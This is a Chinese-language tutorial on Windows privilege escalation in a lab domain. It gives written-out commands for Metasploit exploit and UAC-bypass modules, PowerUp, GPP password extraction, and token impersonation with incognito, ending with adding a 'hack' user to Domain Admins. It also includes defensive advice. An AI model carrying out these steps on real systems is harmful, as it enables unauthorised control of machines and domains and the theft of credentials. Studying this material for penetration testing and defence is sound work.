@@ -1,0 +1,509 @@
+假如我们已经获得了一个Windows系统的普通用户权限，由于低权限用户的很多操作将受到限制。所以，我们会想法设法地将低权限用户提权到高权限用户。例如，从
+Webshell(apache)、数据库权限——>系统普通用户权限——>Administrator权限——>System权限。反正，我们的最终目的就是拿到该主机的最高权限。
+
+##  **Windows提权方式**
+
+![1605453393_5fb146513192ec6c15dae.png!small](https://image.3001.net/images/20201115/1605453393_5fb146513192ec6c15dae.png!small)
+
+##  **0x01 Windows内核溢出漏洞提权**
+
+    
+    
+    Windows内核溢出漏洞提权通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限  
+    本地溢出提权首先要有服务器的一个普通用户权限，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出Administrator权限。  
+    github上windows系统溢出漏洞提权的汇总：https://github.com/SecWiki/windows-kernel-exploits
+
+实战中最常用的本地溢出提权有 CVE-2018-8120、MS16-032、MS15-051 和 MS14-058 。  
+在MSF中，最常用的提权模块是CVE-2018-8120；  
+在CobaltStrike中，最常用的提权模块的是 MS14-058。这四个提权，都有对应的exe程序。exe程序均支持32和64位的机器。
+
+ **手工查找补丁情况**
+
+    
+    
+    systeminfo  
+    Wmic qfe get Caption,Description,HotFixID,InstalledOn  
+    wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB4131188"  #直接找是否存在cve-2018-8120对应的KB4131188补丁
+
+![1605453409_5fb14661688db7d8fef67.png!small](https://image.3001.net/images/20201115/1605453409_5fb14661688db7d8fef67.png!small)
+
+![1605453460_5fb146945ea3bee46bfa1.png!small](https://image.3001.net/images/20201115/1605453460_5fb146945ea3bee46bfa1.png!small)
+
+可以看到只安装了3个补丁
+
+    
+    
+    WMIC是Windows Management Instrumentation Command-line的简称，它是一款命令行管理工具，提供了从命令行接口到批命令脚本执行系统管理的支持，可以说是Windows平台下最有用的命令行工具。使用WMIC，我们不但可以管理本地计算机，还可以管理统一局域网内的所有远程计算机（需要必要的权限），而被管理的计算机不必事先安装WMIC
+
+ **利用Metasploit发现缺失补丁**
+
+利用post/windows/gather/enum_patches 模块 可以根据漏洞编号快速找出系统中缺少的补丁
+
+设置获取的session即可运行
+
+![1605453476_5fb146a4e804520f15256.png!small](https://image.3001.net/images/20201115/1605453476_5fb146a4e804520f15256.png!small)
+
+MSF下还提供了 post/multi/recon/local_exploit_suggester 模块，该模块用于快速识别系统中可能被利用的漏洞
+
+![1605453506_5fb146c2131bfb488b3de.png!small](https://image.3001.net/images/20201115/1605453506_5fb146c2131bfb488b3de.png!small)
+
+ **Windows Exploit Suggester**
+
+该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而其只需要目标系统的信息。
+
+    
+    
+    #更新漏洞数据库，会生成一个xls的文件，如下 2020-11-11-mssb.xls  
+    python windows-exploit-suggester.py --update  
+      
+    #查看目标主机系统信息，保存为sysinfo.txt文件  
+    systeminfo > sysinfo.txt  
+      
+    #然后运行如下命令，查看该系统是否存在可利用的提权漏洞  
+    python windows-exploit-suggester.py -d 2020-11-11-mssb.xls -i sysinfo.txt
+
+![1605453521_5fb146d1f1b380ebfcd2e.png!small](https://image.3001.net/images/20201115/1605453521_5fb146d1f1b380ebfcd2e.png!small)
+
+ **漏洞复现**
+
+选择利用模块攻击
+
+    
+    
+    search  cve-2018-8120
+
+可以看到找到了一个漏洞利用Exploit模块，我们使用该模块
+
+    
+    
+    use exploit/windows/local/ms18_8120_win32k_privesc
+
+![1605453531_5fb146db5fca06577acb1.png!small](https://image.3001.net/images/20201115/1605453531_5fb146db5fca06577acb1.png!small)
+
+设置 session 为我们刚刚获得权限的 session ID，run运行。
+
+![1605453539_5fb146e33a77243124f39.png!small](https://image.3001.net/images/20201115/1605453539_5fb146e33a77243124f39.png!small)
+
+可以看到，我们获得了 System 权限。
+
+##  **0x02 Windows系统配置错误提权**
+
+Windows在系统启动时，会伴随着一些高权服务启动(windows服务是以system权限运行的)倘若某些服务存在一些漏洞，那么就能够借此服务进行权限劫持，例如DLL劫持
+
+ **1.系统服务权限配置错误**
+
+    
+    
+    windows系统服务文件在操作系统启动时加载执行，并在后台调用可执行文件。如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，那么就可以替换该文件，并随着系统启动获得控制权限。  
+    windows服务是以system权限运行的，其文件夹、文件和注册表key-value都是受强制访问控制保护的。但是在某些情况下，操作系统中依然存在一些没有得到有效保护的服务。
+
+ **利用方式**
+
+    
+    
+    1.Powershell中的PowerUp脚本   
+    https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1  
+    加载模块并执行 列出可能存在问题的所有服务    
+    分析能否利用  
+      
+    2.Metasploit中的攻击模块  
+    exploit/windows/local/service_permissions  
+    service_permissions模块会使用 两种方式获取system权限  
+    如果以管理员权限运行 会尝试创建并运行一个新的服务   
+    如果当前权限不允许创建服务 会判断哪些服务的文件或文件夹的权限有问题 并对其进行劫持  
+    在劫持服务时会创建一个可执行程序 其文件名和安装路径都是随机的
+
+![1605453545_5fb146e9cf95cc99605e2.png!small](https://image.3001.net/images/20201115/1605453545_5fb146e9cf95cc99605e2.png!small)
+
+ **2.注册表键AlwaysInstallElevated**
+
+    
+    
+    允许低权限用户以System权限安装文件。如果启用此策略设置项，那么任何权限的用户都以NT Authority\System权限来安装恶意的MSI文件。  
+    windows install是windows操作系统的组件之一，专门用来管理配置软件服务。它除了是一个安装程序，还用于管理软件的安装、组件的添加、删除、监视文件的还原、通过回滚进行灾难恢复。windows install通过msiexec.exe安装MSI文件，双击MSI文件就会运行msiexec.exe。  
+    原理:是因为用户打开了windows installer 特权安装功能
+
+![1605453551_5fb146efe6fdf69d4b829.png!small](https://image.3001.net/images/20201115/1605453551_5fb146efe6fdf69d4b829.png!small)
+
+ **利用方式**
+
+    
+    
+    1.powerup下的Get-RegistryAlwaysInstallElevated模块检查注册表键是否被设置  
+    如果被设置则意味MSI文件是以system权限下能运行  
+    2.Metasploit的exploit/windows/local/always_install_elevated模块  
+    该模块会创建一个文件名随机的MSI文件 并在提权后删除所有已部署的文件
+
+![1605453558_5fb146f662cc4ef09afc8.png!small](https://image.3001.net/images/20201115/1605453558_5fb146f662cc4ef09afc8.png!small)
+
+可以看到成功提权
+
+只要禁用注册表键AlwaysInstallElevated 就可以阻止攻击者通过MSI文件进行提权
+
+ **3、可信任服务路径漏洞**
+
+    
+    
+    利用了windows文件路径解析的特性，如果一个服务调用的可执行文件没有正确处理所引用的完整路径名，这个漏洞就会被攻击者用来上传任意可执行文件。如果一个被适当命名的可执行文件(木马)被上传到受影响的目录中 服务一旦重启 该程序就会以system权限运行  
+    通俗的说，如果一个服务的可执行文件的路径（带空格）没有被双引号引起来，那么这个服务就有漏洞。
+
+寻找存在漏洞的服务
+
+    
+    
+    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """  
+    检测是否有对目标文件夹的写权限 可以使用icacls 工具  
+    如果确认目标机器存在此漏洞 把我们的木马上传到目并重命名  
+    重启服务  
+    sc stop service_name  
+    sc start service_name  
+      
+    可以直接使用metasploit中的      
+    exploit/windows/local/trusted_service_path模块  
+    正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程  
+    set AutoRunScript migrate -f
+
+![1605453568_5fb14700c4f195c8c7f32.png!small](https://image.3001.net/images/20201115/1605453568_5fb14700c4f195c8c7f32.png!small)
+
+上述表示没有可利用的漏洞  
+将文件路径用引号引起来 就不会出现问题
+
+  
+
+ **4、自动安装配置文件**  
+网络管理员在内网中给多台机器配置同一个环境时，通常不会逐个配置，而是使用脚本批量部署。在这个过程中，会使用安装配置文件。这些文件中包含所有的安装配置信息，其中一些还可能包含管理员账号和密码。
+
+![1605453576_5fb14708979a0aeadf5fe.png!small](https://image.3001.net/images/20201115/1605453576_5fb14708979a0aeadf5fe.png!small)
+
+Metasploit集成了漏洞利用模块  
+post/windows/gather/enum_unattend
+
+![1605453580_5fb1470cb6d4d572fd0f9.png!small](https://image.3001.net/images/20201115/1605453580_5fb1470cb6d4d572fd0f9.png!small)
+
+ **5、计划任务**
+
+可以使用如下命令查看计算机计划任务
+
+    
+    
+    schtasks /query /fo LIST /v
+
+AccessChk用于在windows中进行一些高级查询、管理和故障排除工作。由于它是微软官方提供的工具，所以杀毒软件不会有告警。如果黑客对以高权限运行的任务，所在的目录具有写权限，那么就可以使用恶意程序覆盖原有的程序。这样，在计划任务下次执行的时候，就会以高权限运行恶意程序。
+
+通过AccessChk查看指定目录的权限配置情况：
+
+    
+    
+    accesschk64.exe -dqv "C:\Program Files (x86)" -accepteula
+
+![1605453587_5fb1471300f800fae1760.png!small](https://image.3001.net/images/20201115/1605453587_5fb1471300f800fae1760.png!small)
+
+常用命令
+
+> accesschk64.exe /accepteula 第一次运行SysInternals工具包里的工具时 会弹出一个许可协议对话框
+> 使用accepteula参数自动接受许可协议
+>
+> accesschk64.exe -uwdqsUsers C:\ 查看某个驱动器下所有「权限配置」有问题的文件夹：
+>
+> accesschk64.exe -uwdqsUsers c:\\*.* 查看某个驱动器下所有「权限配置」有问题的文件：
+
+PowerUp.ps1脚本的使用
+
+PowerUp.ps1脚本是 Privsec
+目录下的一个脚本，功能非常强大。拥有很多用来寻找目标主机Windows服务配置错误来进行提权的模块。当我们无法通过 windows
+内核漏洞进行提权的话，这个时候我们就可以利用该脚本来寻找目标主机上Windows服务配置错误来进行提权，或者利用常见的系统服务，通过其继承的系统权限来完成提权。
+
+Invoke-Allchecks模块
+
+    
+    
+    powershell -exec bypass -c import-module .\PowerUp.ps1;Invoke-Allchecks -verbose
+
+运行该脚本，该脚本会自动检查PowerUp.ps1下所有的模块，并在存在漏洞利用的模块下的AbuseFunction中直接给出利用方法
+
+![1605453595_5fb1471b085f9aa540422.png!small](https://image.3001.net/images/20201115/1605453595_5fb1471b085f9aa540422.png!small)
+
+##  **0x03 Windows组策略首选项提权(SYSVOL/GPP)**
+
+SYSVOL
+
+SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。
+
+SYSVOL在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。整个SYSVOL目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在
+C:WindowsSYSVOLDOMAINPolicies 目录中。
+
+![1605453601_5fb14721eadd2d5df8dde.png!small](https://image.3001.net/images/20201115/1605453601_5fb14721eadd2d5df8dde.png!small)
+
+![1605453605_5fb14725b55e74c60eb2b.png!small](https://image.3001.net/images/20201115/1605453605_5fb14725b55e74c60eb2b.png!small)
+
+在一般的域环境中，所有机器都是脚本化批量部署的，数据量通常很大。为了方便地对所有的机器进行操作，网络管理员往往会使用域策略进行统一的配置和管理。大多数组织在创建域环境后，会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会修改本地管理员密码。
+
+尽管如此，安全问题依旧存在。通过组策略统一修改的密码，虽然强度有所提高，但所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员密码，就相当于获得了整个域中所有机器的本地管理员密码。
+
+常见的组策略首选项(Group Policy Preferences,GPP)列举如下
+
+> 映射驱动器(Drives.xml)
+>
+> 创建本地用户
+>
+> 数据源(DataSources.xml)
+>
+> 打印机配置(Printers.xml)
+>
+> 创建、更新服务(Services.xml)
+>
+> 计划任务(ScheduledTasks.xml)
+
+组策略首选项提权分析
+
+1：创建组策略，批量修改域中机器的本地管理员密码
+
+在域控上执行：开始——>运行——>输入 gpmc.msc ——>选择kevin.com——>右键组策略对象——>新建，我这里新建一个test组策略
+
+![1605453611_5fb1472b8c6a3de34109e.png!small](https://image.3001.net/images/20201115/1605453611_5fb1472b8c6a3de34109e.png!small)
+
+右键刚刚新建的组策略，编辑
+
+会弹出一个组策略管理编辑器，然后 计算机配置——>首选项——>控制面板设置——>本地用户和组
+
+![1605453618_5fb14732193f8c898664a.png!small](https://image.3001.net/images/20201115/1605453618_5fb14732193f8c898664a.png!small)
+
+右键本地用户和组——>新建——>本地用户
+
+我们将域中每个计算机的本地密码设置成 qwer123456.
+
+![1605453623_5fb147370ec8b6e606a23.png!small](https://image.3001.net/images/20201115/1605453623_5fb147370ec8b6e606a23.png!small)
+
+然后将Domain Computers添加到组策略应用的组中
+
+![1605453628_5fb1473cc67fa9093de92.png!small](https://image.3001.net/images/20201115/1605453628_5fb1473cc67fa9093de92.png!small)
+
+强制更新组策略
+
+    
+    
+    gpupdate /foce
+
+2：获取组策略的凭据
+
+管理员在域中新建一个组策略后，操作系统会自动在SYSVO共享目录中生成一个XML文件，该文件中保存了该组策略更新后的密码。该密码使用AES-256加密算法，安全性还是比较高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低。任何域用户和域信任的用户均可对该共享目录进行访问，这就意味着，任何用户都可以访问保存在XML文件中的密码并将其解密，从而控制域中所有使用该账号、密码的本地管理员计算机。在SYSVOL中搜索，可以找到Groups.xml文件。找到其中的cpassword字段，该字段是用AES-256算法加密的，  
+qwer123456.加密后的密文7ud2rxJhwxT5iaNrNltLxQcQ1hNN2cmCgxha3Faj4YA![1605679291_5fb4b8bb5e1560c7ba9e9.png!small?1605679291072](https://image.3001.net/images/20201118/1605679291_5fb4b8bb5e1560c7ba9e9.png!small?1605679291072)
+
+  
+
+ **使用PowerShell获取cpassword**  
+PowerSploit中的Get-GPPPassword.ps1脚本可以获取组策略中的密码。注意，我们只需要在域内任何一台以域用户权限登录的机器上均可查询到。
+
+    
+    
+    Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword
+
+![1605453645_5fb1474db7a4b16d81ccb.png!small](https://image.3001.net/images/20201115/1605453645_5fb1474db7a4b16d81ccb.png!small)
+
+ **使用MSF获取cpassword**  
+MSF中 post/windows/gather/credentials/gpp
+模块可以获取组策略中的密码。注意，我们只需要获取域内任何一台以域用户权限登录的机器的权限即可。
+
+![1605453650_5fb147528d43b5b0446c7.png!small](https://image.3001.net/images/20201115/1605453650_5fb147528d43b5b0446c7.png!small)
+
+ ** **针对组策略首选项提权的防御措施****
+
+在用于管理组策略的计算机上安装
+KB2962486补丁，防止新的凭据被放置在组策略首选项中。微软在2014年修复了组策略首选项提权漏洞，使用的方法就是不再将密码保存在组策略首选项中。
+
+此外，针对Everyone访问权限进行设置，具体如下：
+
+> 设置共享文件夹SYSVOL的访问权限  
+> 将包含组策略密码的 XML 文件从 SYSVOL 目录中删除  
+> 不要把密码放在所有域用户都有权访问的文件中  
+> 如果需要更改域中机器的本地管理员密码，建议使用LAPS
+
+ ** **0x04 绕过UAC提权****
+
+UAC(User Account Control，用户账号控制)是微软为了提高系统安全性在Windows Vista中引入的技术。
+
+UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。
+
+在Windows
+Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。
+
+在权限不够的情况下，访问系统磁盘的根目录、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account
+Control，用户账号控制)的认证。
+
+![1605453658_5fb1475a7630527a89163.png!small](https://image.3001.net/images/20201115/1605453658_5fb1475a7630527a89163.png!small)
+
+需要UAC的授权才能进行的操作列表如下：
+
+    
+    
+    配置Windows Update  
+    增加、删除账户  
+    更改账户类型  
+    更改UAC的设置  
+    安装ActiveX  
+    安装、卸载程序  
+    安装设备驱动程序  
+    将文件移动/复制到Program Files或Windows目录下  
+    查看其它用户的文件夹
+
+UAC有如下四种设置要求：
+
+    
+    
+    始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户  
+    仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户  
+    仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度  
+    从不提示：当用户为系统管理员时，所有程序都会以最高权限运行
+
+ **MSF下实战利用**  
+Bypassuac提权的MSF模块
+
+    
+    
+    use exploit/windows/local/bypassuac  #该模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC。该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。use exploit/windows/local/bypassuac_injection  #该模块直接运行在内存的反射DLL中(内存注入)，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。use exploit/windows/local/bypassuac_fodhelper #该模块通过FodHelper注册表项，通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将为我们生成另一个关闭UAC的shell。虽然该模块修改了注册表，但它会在调用payload后清除该键。相比之前的模块，该模块对架构系统并无特别要求。如果指定EXE::Custom DLL，则应在单独的进程中启动payload后调用ExitProcess()。use exploit/windows/local/bypassuac_eventvwr #Windows提权UAC保护绕过（通过Eventvwr注册表项）use exploit/windows/local/bypassuac_comhijack #Windows提权UAC保护绕过（COM处理程序劫持） 此模块将通过在HKCU配置单元中，创建COM处理程序注册表项来绕过Windows UAC。当加载某些高完整性进程时将会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL中包含了可提升权限的payload。在调用payload后该模块将会清除该键。该模块的使用需要选择正确的架构，但在当前低权限的Meterpreter session下架构可以不同。如果指定EXE::Custom DLL，则应在单独的进程中启动payload后调用ExitProcess()。该模块需要通过目标系统上的cmd.exe来调用目标二进制文件，因此如果限制cmd.exe访问，则此模块将无法正常运行。
+
+ **MSF中Bypassuac模块的使用前提有两个**
+
+    
+    
+    一是系统当前用户必须在管理员组中  
+    二是用户账户控制程序UAC设置为默认，即 “仅在程序试图更改我的计算机时通知我”
+
+ **这里获取的kevin用户在管理员组中，且 UAC设置为默认**  
+使用use
+exploit/windows/local/bypassuac_injection模块，连续攻击两次都失败。提示32位的目标攻击64位的系统，但是我这里是使用的64为的target，也还是失败
+
+![1605453669_5fb147651d1e30fecbd07.png!small](https://image.3001.net/images/20201115/1605453669_5fb147651d1e30fecbd07.png!small)
+
+使用exploit/windows/local/bypassuac_eventvwr则提权成功
+
+![1605453677_5fb1476dbb4f213173b8b.png!small](https://image.3001.net/images/20201115/1605453677_5fb1476dbb4f213173b8b.png!small)
+
+ **Runas模块**
+
+使用 exploit/windows/local/ask 模块，需要使用 EXE::Custom
+选项创建一个可执行文件(需要免杀)，目标机器会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择继续运行程序，就会返回一个高权限的shell。
+
+使用该模块的前提：
+
+    
+    
+    当前用户必须在管理员组中 或 知道管理员的密码，对UAC的设置则没有要求。  
+    用户需要手动点击弹出的程序，是
+
+![1605453686_5fb147769bad9e84e6490.png!small](https://image.3001.net/images/20201115/1605453686_5fb147769bad9e84e6490.png!small)
+
+![1605453690_5fb1477ae4a482a5fe6b2.png!small](https://image.3001.net/images/20201115/1605453690_5fb1477ae4a482a5fe6b2.png!small)
+
+ **Nishang中的Invoke-PsUACme.ps1**  
+Invoke-PsUACme模块使用来自UACME项目的DLL绕过UAC。
+
+    
+    
+    Import-Module .\Invoke-PsUACme.ps1;Invoke-PsUACme -verbose  #使用sysprep方法并执行默认的payload  
+    Import-Module .\Invoke-PsUACme.ps1;Invoke-PsUACme -method oobe -verbose  #使用oobe方法并执行默认的payload
+
+![1605453701_5fb14785a08f16755e937.png!small](https://image.3001.net/images/20201115/1605453701_5fb14785a08f16755e937.png!small)
+
+可以看到成功添加hack用户 没有提示拒绝访问(普通用户权限会提示拒绝访问)
+
+ **针对绕过UAC提权的防御措施**
+
+在企业网络环境中，防止绕过UAC的最好方法是不让内网机器的使用者拥有本地管理员权限，从而降低系统遭受攻击的可能性。  
+使用本地管理员权限登录的用户，要将UAC设置为“始终通知”或者删除该用户的本地管理员权限(这样设置后，会像在Windows
+Vista中一样，总是弹出警告)。
+
+##  **0x05 令牌窃取**
+
+令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。
+
+假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。
+
+令牌分类
+
+    
+    
+    访问令牌(Access Token)：表示访问控制操作主体的系统对象  
+    会话令牌(Session Token)：是交互会话中唯一的身份标识符。  
+    密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾
+
+Windows的AccessToken有两种类型：
+
+    
+    
+    Delegation Token：授权令牌，它支持交互式会话登录(例如本地用户直接登录、远程桌面登录访问)  
+    Impresonation Token：模拟令牌，它是非交互的会话(例如使用net use访问共享文件夹)
+
+Windows Access Token产生过程
+
+    
+    
+    每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。
+
+ **AccessToken的窃取与利用**
+
+    
+    
+    AccessToken的窃取与利用需要administrator管理员组权限。  
+    窃取AccessToken的数量：  
+    incognito.exe程序 > InvokeTokenManipulat.ps1脚本 > MSF里的incognito模块
+
+1：程序 incognito.exe  
+程序地址：https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip  
+AccessToken的列举(需要administrator权限)
+
+    
+    
+    incognito.exe list_tokens -u
+
+![1605453709_5fb1478d2db552b985439.png!small](https://image.3001.net/images/20201115/1605453709_5fb1478d2db552b985439.png!small)
+
+ **模拟其他用户的令牌**
+
+    
+    
+    incognito.exe execute -c "完整的Token名" cmd.exe  
+    例如：模拟system权限用户  
+    incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
+
+![1605453715_5fb1479364163ad4732f2.png!small](https://image.3001.net/images/20201115/1605453715_5fb1479364163ad4732f2.png!small)
+
+ **2.Invoke-TokenManipulation.ps1脚本**  
+这个脚本是PowerSploit下Exfiltration文件夹内的一个脚本  
+使用命令如下：
+
+    
+    
+    列举token  
+    Invoke-TokenManipulation -Enumerate  
+    提权至system  
+    Invoke-TokenManipulation -CreateProcess "cmd.exe" -username "nt authority\system"  
+    复制进程token  
+    Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 500  
+    复制线程token  
+    Invoke-TokenManipulation -CreateProcess "cmd.exe" -ThreadId 500
+
+![1605453722_5fb1479a294eb0efc9fce.png!small](https://image.3001.net/images/20201115/1605453722_5fb1479a294eb0efc9fce.png!small)
+
+![1605453727_5fb1479f2f583cc2c889a.png!small](https://image.3001.net/images/20201115/1605453727_5fb1479f2f583cc2c889a.png!small)
+
+ **3：MSF下的incognito模块**  
+需要administrator权限
+
+    
+    
+    use incognito #加载incognito  
+    list_tokens -u #列出AccessToken  
+    impersonate_token "NT AUTHORITY\SYSTEM" #模拟system用户，getsystem命令即实现了该命令。如果要模拟其他用户，将token名改为其他用户即可  
+    rev2self #返回到之前的AccessToken权限  
+    域内的话可以添加域用户并添加进域管理组进行敏感操作  
+    add_user hack qwer123456! -h 192.168.13.132   
+    add_group_user "Domain Admins" hack -h 192.168.13.132
+
+![1605453731_5fb147a3f39ff886f77c6.png!small](https://image.3001.net/images/20201115/1605453731_5fb147a3f39ff886f77c6.png!small)
+
+![1605453736_5fb147a85fcb30bdd4954.png!small](https://image.3001.net/images/20201115/1605453736_5fb147a85fcb30bdd4954.png!small)
+**Windows Access Token令牌假冒防御**  
+禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从控制DC。  
+如果想清除假冒，重启服务器即可。
+
